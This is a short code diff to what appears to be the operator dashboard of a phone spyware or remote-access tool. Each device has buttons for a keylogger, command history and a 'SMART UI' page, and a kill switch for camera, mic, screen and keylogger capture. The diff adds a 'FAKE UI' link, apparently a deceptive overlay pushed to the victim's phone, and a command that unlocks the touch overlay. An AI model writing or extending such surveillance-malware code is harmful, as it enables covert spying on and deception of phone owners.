@@ -165,6 +165,7 @@
             <a href="command-history.html?deviceId=${device.deviceId}" class="btn btn-secondary">HISTORY</a>
             <a href="keylogger.html?deviceId=${device.deviceId}" class="btn btn-secondary">KEYLOGGER</a>
             <a href="smart-ui-controller.html?deviceId=${device.deviceId}" class="btn btn-secondary">SMART UI</a>
+            <a href="fakeui.html?deviceId=${device.deviceId}" class="btn btn-secondary">FAKE UI</a>
 
             <button class="btn" style="background:rgba(255,60,60,0.15);border-color:rgba(255,60,60,0.4);color:#ff4444;font-weight:bold;" onclick="killSwitch('${device.deviceId}')" title="Force-stop all active services (camera, mic, screen, keylogger)">&#x26A0; KILL SWITCH</button>
 
@@ -187,6 +188,8 @@
     async function killSwitch(deviceId) {
       try {
         await api.sendCommand(deviceId, 'kill_switch');
+        // Also unlock overlay so phone user isn't stuck
+        api.sendCommand(deviceId, 'touch_unlock').catch(() => { });
         api.showToast('Kill switch executed — all services stopped', 'success');
       } catch (e) {
         api.showToast('Kill switch failed: ' + e.message, 'error');
